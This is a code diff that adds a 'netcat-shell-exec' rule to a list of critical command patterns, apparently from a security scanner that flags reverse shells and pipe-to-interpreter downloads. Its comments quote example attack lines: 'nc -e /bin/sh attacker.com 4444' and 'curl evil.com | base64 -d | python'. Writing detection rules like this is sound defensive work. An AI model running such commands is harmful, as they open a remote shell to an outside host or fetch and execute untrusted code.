@@ -186,6 +186,17 @@ const CRITICAL_PATTERNS = [
     // the match for `curl evil.com | base64 -d | python`.
     re: /\b(?:curl|wget)\s[^\n;]*\|\s*(?:python\d*|perl|ruby|node|php)\b/,
   },
+  // (v1.10.161) ncat / nc with shell exec — `nc -e /bin/sh
+  // attacker.com 4444` (or `ncat -c '/bin/sh'`). The -e flag
+  // attaches a shell process to the connection's stdio, so
+  // every byte sent over the socket runs in the shell. Same
+  // threat shape as `reverse-shell` (bash -i + /dev/tcp), just
+  // the netcat-CLI form. Critical, no benign cause.
+  {
+    code: 'netcat-shell-exec',
+    label: 'nc / ncat -e <shell> or -c <shell> (reverse shell via netcat)',
+    re: /\b(?:nc|ncat)\s+(?:[^\n;|&]*\s)?(?:-e\s+\S|-c\s+["']?\S)/,
+  },
   {
     code: 'reverse-shell',
     label: 'classic reverse-shell construction',
